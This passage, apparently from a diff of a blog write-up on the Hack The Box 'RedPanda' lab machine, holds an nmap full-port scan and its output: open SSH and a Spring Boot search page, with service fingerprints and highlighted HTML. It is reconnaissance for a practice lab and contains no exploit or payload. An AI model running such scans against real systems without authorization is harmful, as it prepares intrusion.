3e%0a%20%20%7c%20%20%20%20%20%3cspan%3e%3c/span%3e%0a%20%20%7c%20%20%20%20%20%3c/div%3e%0a%20%20%7c%20%20%20%20%20%3cdiv%20class=%27face%27%3e%0a%20%20%7c%20%20%20%20%20%3cdiv%20class=%27eye%0a%20%20%7c%20%20%20HTTPOptions:%0a%20%20%7c%20%20%20%20%20HTTP/1.1%20200%0a%20%20%7c%20%20%20%20%20Allow:%20GET,HEAD,OPTIONS%0a%20%20%7c%20%20%20%20%20Content-Length:%200%0a%20%20%7c%20%20%20%20%20Date:%20Fri,%2027%20Dec%202024%2015:20:47%20GMT%0a%20%20%7c%20%20%20%20%20Connection:%20close%0a%20%20%7c%20%20%20RTSPRequest:%0a%20%20%7c%20%20%20%20%20HTTP/1.1%20400%0a%20%20%7c%20%20%20%20%20Content-Type:%20text/html;charset=utf-8%0a%20%20%7c%20%20%20%20%20Content-Language:%20en%0a%20%20%7c%20%20%20%20%20Content-Length:%20435%0a%20%20%7c%20%20%20%20%20Date:%20Fri,%2027%20Dec%202024%2015:20:47%20GMT%0a%20%20%7c%20%20%20%20%20Connection:%20close%0a%20%20%7c%20%20%20%20%20%3c!doctype%20html%3e%3chtml%20lang=%22en%22%3e%3chead%3e%3ctitle%3eHTTP%20Status%20400%0a%20%20%7c%20%20%20%20%20Request%3c/title%3e%3cstyle%20type=%22text/css%22%3ebody%20%7bfont-family:Tahoma,Arial,sans-serif;%7d%20h1,%20h2,%20h3,%20b%20%7bcolor:white;background-color:#525D76;%7d%20h1%20%7bfont-size:22px;%7d%20h2%20%7bfont-size:16px;%7d%20h3%20%7bfont-size:14px;%7d%20p%20%7bfont-size:12px;%7d%20a%20%7bcolor:black;%7d%20.line%20%7bheight:1px;background-color:#525D76;border:none;%7d%3c/style%3e%3c/head%3e%3cbody%3e%3ch1%3eHTTP%20Status%20400%0a%20%20%7c_%20%20%20%20Request%3c/h1%3e%3c/body%3e%3c/html%3e%0a%20%201%20service%20unrecognized%20despite%20returning%20data.%20If%20you%20know%20the%20service/version,%20please%20submit%20the%20following%20fingerprint%20at%20https://nmap.org/cgi-bin/submit.cgi?new-service%20:%0a%20%20SF-Port8080-TCP:V=7.94SVN%25I=7%25D=12/27%25Time=676EC5CD%25P=x86_64-pc-linux-gnu%25%0a%20%20SF:r%28GetRequest,690,%22HTTP/1%5c.1%5cx20200%5cx20%5cr%5cnContent-Type:%5cx20text/html;ch%0a%20%20SF:arset=UTF-8%5cr%5cnContent-Language:%5cx20en-US%5cr%5cnDate:%5cx20Fri,%5cx2027%5cx20Dec%0a%20%20SF:%5cx202024%5cx2015:20:47%5cx20GMT%5cr%5cnConnection:%5cx20close%5cr%5cn%5cr%5cn%3c!DOCTYPE%5cx2%0a%20%20SF:0html%3e%5cn%3chtml%5cx20lang=%5c%22en%5c%22%5cx20dir=%5c%22ltr%5c%22%3e%5cn%5cx20%5cx20%3chead%3e%5cn%5cx20%5cx20%5c%0a%20%20SF:x20%5cx20%3cmeta%5cx20charset=%5c%22utf-8%5c%22%3e%5cn%5cx20%5cx20%5cx20%5cx20%3cmeta%5cx20author=%5c%22w%0a%20%20SF:ooden_k%5c%22%3e%5cn%5cx20%5cx20%5cx20%5cx20%3c!--Codepen%5cx20by%5cx20khr2003:%5cx20https://co%0a%20%20SF:depen%5c.io/khr2003/pen/BGZdXw%5cx20--%3e%5cn%5cx20%5cx20%5cx20%5cx20%3clink%5cx20rel=%5c%22sty%0a%20%20SF:lesheet%5c%22%5cx20href=%5c%22css/panda%5c.css%5c%22%5cx20type=%5c%22text/css%5c%22%3e%5cn%5cx20%5cx20%5cx2%0a%20%20SF:0%5cx20%3clink%5cx20rel=%5c%22stylesheet%5c%22%5cx20href=%5c%22css/main%5c.css%5c%22%5cx20type=%5c%22te%0a%20%20SF:xt/css%5c%22%3e%5cn%5cx20%5cx20%5cx20%5cx20%3ctitle%3eRed%5cx20Panda%5cx20Search%5cx20%5c%7c%5cx20Made%5c%0a%20%20SF:x20with%5cx20Spring%5cx20Boot%3c/title%3e%5cn%5cx20%5cx20%3c/head%3e%5cn%5cx20%5cx20%3cbody%3e%5cn%5cn%5c%0a%20%20SF:x20%5cx20%5cx20%5cx20%3cdiv%5cx20class=%27pande%27%3e%5cn%5cx20%5cx20%5cx20%5cx20%5cx20%5cx20%3cdiv%5cx20%0a%20%20SF:class=%27ear%5cx20left%27%3e%3c/div%3e%5cn%5cx20%5cx20%5cx20%5cx20%5cx20%5cx20%3cdiv%5cx20class=%27ear%5c%0a%20%20SF:x20right%27%3e%3c/div%3e%5cn%5cx20%5cx20%5cx20%5cx20%5cx20%5cx20%3cdiv%5cx20class=%27whiskers%5cx20le%0a%20%20SF:ft%27%3e%5cn%5cx20%5cx20%5cx20%5cx20%5cx20%5cx20%5cx20%5cx20%5cx20%5cx20%3cspan%3e%3c/span%3e%5cn%5cx20%5cx20%5cx%0a%20%20SF:20%5cx20%5cx20%5cx20%5cx20%5cx20%5cx20%5cx20%3cspan%3e%3c/span%3e%5cn%5cx20%5cx20%5cx20%5cx20%5cx20%5cx20%5cx%0a%20%20SF:20%5cx20%5cx20%5cx20%3cspan%3e%3c/span%3e%5cn%5cx20%5cx20%5cx20%5cx20%5cx20%5cx20%3c/div%3e%5cn%5cx20%5cx20%5cx%0a%20%20SF:20%5cx20%5cx20%5cx20%3cdiv%5cx20class=%27whiskers%5cx20right%27%3e%5cn%5cx20%5cx20%5cx20%5cx20%5cx20%5c%0a%20%20SF:x20%5cx20%5cx20%3cspan%3e%3c/span%3e%5cn%5cx20%5cx20%5cx20%5cx20%5cx20%5cx20%5cx20%5cx20%3cspan%3e%3c/span%3e%0a%20%20SF:%5cn%5cx20%5cx20%5cx20%5cx20%5cx20%5cx20%5cx20%5cx20%3cspan%3e%3c/span%3e%5cn%5cx20%5cx20%5cx20%5cx20%5cx20%5cx%0a%20%20SF:20%3c/div%3e%5cn%5cx20%5cx20%5cx20%5cx20%5cx20%5cx20%3cdiv%5cx20class=%27face%27%3e%5cn%5cx20%5cx20%5cx20%5cx%0a%20%20SF:20%5cx20%5cx20%5cx20%5cx20%3cdiv%5cx20class=%27eye%22%29%25r%28HTTPOptions,75,%22HTTP/1%5c.1%5cx202%0a%20%20SF:00%5cx20%5cr%5cnAllow:%5cx20GET,HEAD,OPTIONS%5cr%5cnContent-Length:%5cx200%5cr%5cnDate:%5cx%0a%20%20SF:20Fri,%5cx2027%5cx20Dec%5cx202024%5cx2015:20:47%5cx20GMT%5cr%5cnConnection:%5cx20close%5c%0a%20%20SF:r%5cn%5cr%5cn%22%29%25r%28RTSPRequest,24E,%22HTTP/1%5c.1%5cx20400%5cx20%5cr%5cnContent-Type:%5cx20t%0a%20%20SF:ext/html;charset=utf-8%5cr%5cnContent-Language:%5cx20en%5cr%5cnContent-Length:%5cx2%0a%20%20SF:0435%5cr%5cnDate:%5cx20Fri,%5cx2027%5cx20Dec%5cx202024%5cx2015:20:47%5cx20GMT%5cr%5cnConnec%0a%20%20SF:tion:%5cx20close%5cr%5cn%5cr%5cn%3c!doctype%5cx20html%3e%3chtml%5cx20lang=%5c%22en%5c%22%3e%3chead%3e%3ctit%0a%20%20SF:le%3eHTTP%5cx20Status%5cx20400%5cx20%5cxe2%5cx80%5cx93%5cx20Bad%5cx20Request%3c/title%3e%3cstyl%0a%20%20SF:e%5cx20type=%5c%22text/css%5c%22%3ebody%5cx20%7bfont-family:Tahoma,Arial,sans-serif;%7d%5cx%0a%20%20SF:20h1,%5cx20h2,%5cx20h3,%5cx20b%5cx20%7bcolor:white;background-color:#525D76;%7d%5cx20%0a%20%20SF:h1%5cx20%7bfont-size:22px;%7d%5cx20h2%5cx20%7bfont-size:16px;%7d%5cx20h3%5cx20%7bfont-size:%0a%20%20SF:14px;%7d%5cx20p%5cx20%7bfont-size:12px;%7d%5cx20a%5cx20%7bcolor:black;%7d%5cx20%5c.line%5cx20%7bh%0a%20%20SF:eight:1px;background-color:#525D76;border:none;%7d%3c/style%3e%3c/head%3e%3cbody%3e%3ch%0a%20%20SF:1%3eHTTP%5cx20Status%5cx20400%5cx20%5cxe2%5cx80%5cx93%5cx20Bad%5cx20Request%3c/h1%3e%3c/body%3e%3c/%0a%20%20SF:html%3e%22%29;%0a%20%20Device%20type:%20general%20purpose%0a%20%20Running:%20Linux%205.X%0a%20%20OS%20CPE:%20cpe:/o:linux:linux_kernel:5.0%0a%20%20OS%20details:%20Linux%205.0%0a%20%20Network%20Distance:%202%20hops%0a%20%20Service%20Info:%20OS:%20Linux;%20CPE:%20cpe:/o:linux:linux_kernel%0a%0a%20%20OS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0a%20%20Nmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%2066.89%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>  kali in HTB/BlogEntriesMade/RedPanda/scans/nmap  🍣 main  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>  🕙 15:19:23 zsh ❯ sudo nmap -p- -sV -sC -O --disable-arp-ping $box -oA FullTCP
+</span></span><span style="display:flex;"><span>  [sudo] password for kali:
+</span></span><span style="display:flex;"><span>  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 15:19 GMT
+</span></span><span style="display:flex;"><span>  Nmap scan report for 10.129.227.207
+</span></span><span style="display:flex;"><span>  Host is up (0.038s latency).
+</span></span><span style="display:flex;"><span>  Not shown: 65451 closed tcp ports (reset), 82 filtered tcp ports (no-response)
+</span></span><span style="display:flex;"><span>  PORT     STATE SERVICE    VERSION
+</span></span><span style="display:flex;"><span>  22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>  | ssh-hostkey:
+</span></span><span style="display:flex;"><span>  |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+</span></span><span style="display:flex;"><span>  |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+</span></span><span style="display:flex;"><span>  |_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+</span></span><span style="display:flex;"><span>  8080/tcp open  http-proxy
+</span></span><span style="display:flex;"><span>  |_http-title: Red Panda Search | Made with Spring Boot
+</span></span><span style="display:flex;"><span>  |_http-open-proxy: Proxy might be redirecting requests
+</span></span><span style="display:flex;"><span>  | fingerprint-strings:
+</span></span><span style="display:flex;"><span>  |   GetRequest:
+</span></span><span style="display:flex;"><span>  |     HTTP/1.1 200
+</span></span><span style="display:flex;"><span>  |     Content-Type: text/html;charset=UTF-8
+</span></span><span style="display:flex;"><span>  |     Content-Language: en-US
+</span></span><span style="display:flex;"><span>  |     Date: Fri, 27 Dec 2024 15:20:47 GMT
+</span></span><span style="display:flex;"><span>  |     Connection: close
+</span></span><span style="display:flex;"><span>  |     <span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span> <span style="color:#a6e22e">dir</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ltr&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">author</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;wooden_k&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  |     <span style="color:#75715e">&lt;!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw --&gt;</span>
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/panda.css&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/main.css&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">title</span>&gt;Red Panda Search | Made with Spring Boot&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pande&#39;</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ear left&#39;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ear right&#39;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;whiskers left&#39;</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;whiskers right&#39;</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;face&#39;</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;eye
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  |   HTTPOptions:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  |     HTTP/1.1 200
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  |     Allow: GET,HEAD,OPTIONS
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  |     Content-Length: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  |     Date: Fri, 27 Dec 2024 15:20:47 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  |     Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  |   RTSPRequest:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  |     HTTP/1.1 400
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  |     Content-Type: text/html;charset=utf-8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  |     Content-Language: en
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  |     Content-Length: 435
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  |     Date: Fri, 27 Dec 2024 15:20:47 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  |     Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  |     &lt;!doctype html&gt;&lt;html lang=&#34;en&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  |     Request&lt;/title&gt;&lt;style type=&#34;text/css&#34;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  |_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF-Port8080-TCP:V=7.94SVN%I=7%D=12/27%Time=676EC5CD%P=x86_64-pc-linux-gnu%
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:r(GetRequest,690,&#34;HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;ch
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:arset=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Fri,\x2027\x20Dec
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:\x202024\x2015:20:47\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:0html&gt;\n&lt;html\x20lang=\&#34;en\&#34;\x20dir=\&#34;ltr\&#34;&gt;\n\x20\x20&lt;head&gt;\n\x20\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:x20\x20&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;\n\x20\x20\x20\x20&lt;meta\x20author=\&#34;w
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:ooden_k\&#34;&gt;\n\x20\x20\x20\x20&lt;!--Codepen\x20by\x20khr2003:\x20https://co
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:depen\.io/khr2003/pen/BGZdXw\x20--&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;sty
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:lesheet\&#34;\x20href=\&#34;css/panda\.css\&#34;\x20type=\&#34;text/css\&#34;&gt;\n\x20\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:0\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;css/main\.css\&#34;\x20type=\&#34;te
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:xt/css\&#34;&gt;\n\x20\x20\x20\x20&lt;title&gt;Red\x20Panda\x20Search\x20\|\x20Made\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:x20with\x20Spring\x20Boot&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\n\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:x20\x20\x20\x20&lt;div\x20class=&#39;</span><span style="color:#a6e22e">pande</span><span style="color:#960050;background-color:#1e0010">&#39;</span>&gt;\n\x20\x20\x20\x20\x20\x20&lt;<span style="color:#f92672">div</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SF:class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ear\x20left&#39;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;\n\x20\x20\x20\x20\x20\x20&lt;<span style="color:#f92672">div</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ear\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:x20right&#39;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;\n\x20\x20\x20\x20\x20\x20&lt;<span style="color:#f92672">div</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;whiskers\x20le
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:ft&#39;</span>&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;\n\x20\x20\x
+</span></span><span style="display:flex;"><span>  SF:20\x20\x20\x20\x20\x20\x20\x20&lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;\n\x20\x20\x20\x20\x20\x20\x
+</span></span><span style="display:flex;"><span>  SF:20\x20\x20\x20&lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;\n\x20\x20\x20\x20\x20\x20&lt;/<span style="color:#f92672">div</span>&gt;\n\x20\x20\x
+</span></span><span style="display:flex;"><span>  SF:20\x20\x20\x20&lt;<span style="color:#f92672">div</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;whiskers\x20right&#39;</span>&gt;\n\x20\x20\x20\x20\x20\
+</span></span><span style="display:flex;"><span>  SF:x20\x20\x20&lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+</span></span><span style="display:flex;"><span>  SF:\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;\n\x20\x20\x20\x20\x20\x
+</span></span><span style="display:flex;"><span>  SF:20&lt;/<span style="color:#f92672">div</span>&gt;\n\x20\x20\x20\x20\x20\x20&lt;<span style="color:#f92672">div</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;face&#39;</span>&gt;\n\x20\x20\x20\x
+</span></span><span style="display:flex;"><span>  SF:20\x20\x20\x20\x20&lt;<span style="color:#f92672">div</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;eye&#34;)%r(HTTPOptions,75,&#34;HTTP/1\.1\x202</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SF:00</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">nAllow:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20GET</span><span style="color:#960050;background-color:#1e0010">,</span><span style="color:#a6e22e">HEAD</span><span style="color:#960050;background-color:#1e0010">,</span><span style="color:#a6e22e">OPTIONS</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">nContent-Length:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x200</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">nDate:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SF:20Fri</span><span style="color:#960050;background-color:#1e0010">,\</span><span style="color:#a6e22e">x2027</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20Dec</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x202024</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x2015:20:47</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20GMT</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">nConnection:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20close</span><span style="color:#960050;background-color:#1e0010">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SF:r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">n</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">n</span><span style="color:#960050;background-color:#1e0010">&#34;)%</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">RTSPRequest</span><span style="color:#960050;background-color:#1e0010">,</span><span style="color:#a6e22e">24E</span><span style="color:#960050;background-color:#1e0010">,&#34;</span><span style="color:#a6e22e">HTTP</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">1</span><span style="color:#960050;background-color:#1e0010">\.</span><span style="color:#a6e22e">1</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20400</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">nContent-Type:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20t</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SF:ext</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">html</span><span style="color:#960050;background-color:#1e0010">;</span><span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x2</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SF:0435</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">nDate:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20Fri</span><span style="color:#960050;background-color:#1e0010">,\</span><span style="color:#a6e22e">x2027</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20Dec</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x202024</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x2015:20:47</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20GMT</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">nConnec</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SF:tion:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20close</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">n</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">n</span><span style="color:#960050;background-color:#1e0010">&lt;!</span><span style="color:#a6e22e">doctype</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20html</span>&gt;&lt;<span style="color:#f92672">html</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;en\&#34;</span>&gt;&lt;<span style="color:#f92672">head</span>&gt;&lt;<span style="color:#f92672">tit</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SF:le</span>&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request&lt;/<span style="color:#f92672">title</span>&gt;&lt;<span style="color:#f92672">styl</span>
